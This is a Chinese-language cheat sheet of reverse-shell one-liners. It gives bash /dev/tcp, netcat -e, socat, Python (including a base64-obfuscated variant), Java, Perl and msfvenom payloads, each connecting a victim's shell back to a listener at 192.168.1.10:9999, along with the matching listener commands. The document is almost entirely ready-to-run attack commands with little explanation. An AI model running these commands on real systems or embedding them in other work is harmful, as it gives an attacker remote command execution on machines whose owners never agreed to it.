# 反弹 SHELL

> [反弹SHELL介绍及原理 - Cocowool ](https://www.cnblogs.com/cocowool/p/reverse-shell.html)
> 
> [linux各种一句话反弹shell总结 - [myles007](https://www.anquanke.com/member/125339)](https://www.anquanke.com/post/id/87017)

## 反弹SHELL工具

### BASH

```bash
# 控制端 监听端口,等待 被控端连接
nc -lvp 9999

# 被控端 将本地bash反弹到 控制端
bash -i >& /dev/tcp/192.168.1.10/9999 0>&1 2>&1
```

## netcat

```bash
# 控制端 监听端口,等待 被控端连接
nc -lvp 9999

# 被控端 将本地bash反弹到 控制端
nc 192.168.1.10 9999 -t -e /usr/bin/bash
```

## socat

```bash
# 控制端 监听端口,等待 被控端连接
socat TCP-LISTEN:9999 -

# 被控端 将本地bash反弹到 控制端
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.10:9999
```

## python

```bash
# 未加密版
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# base64加密版
python -c "exec('aW1wb3J0IHNvY2tldCAgICAgICAgLCBzdWJwcm9jZXNzICAgICAgICAsIG9zICAgICAgICA7ICBob3N0PSIxOTIuMTY4LjMxLjIwMCIgICAgICAgIDsgIHBvcnQ9MTIzNDUgICAgICAgIDsgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAgLCBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgICA7ICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgcG9ydCkpICAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgMCkgICAgICAgIDsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAxKSAgICAgICAgOyAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsIDIpICAgICAgICA7ICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='.decode('base64'))"
```

## java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.10/9999;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## perl

```bash
perl -e 'use Socket;$i="192.168.1.10";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## msfvenom

```bash
# msfvenom 框架提供了大量类unix的命令,都是以 cmd/unix/reverse_xxx 的格式
msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.10 lport=9999 R
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.10 lport=9999 R                                                                                         |     |     |     |
```
